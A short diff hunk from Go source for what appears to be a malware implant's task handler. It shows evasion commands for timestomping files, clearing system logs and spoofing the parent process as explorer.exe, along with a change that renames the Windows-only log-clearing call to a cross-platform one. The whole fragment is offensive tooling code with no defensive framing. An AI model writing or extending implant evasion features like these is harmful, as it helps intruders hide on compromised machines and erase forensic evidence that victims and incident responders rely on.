@@ -298,7 +298,7 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 					output = []byte("Usage: evasion timestomp <target-file> <reference-file>")
 				}
 			case "clearlogs":
-				logResults := ClearWindowsLogs()
+				logResults := ClearPlatformLogs()
 				output = []byte(strings.Join(logResults, "\n"))
 			case "ppidspoof":
 				parentPID, _ := FindProcessByName("explorer.exe")
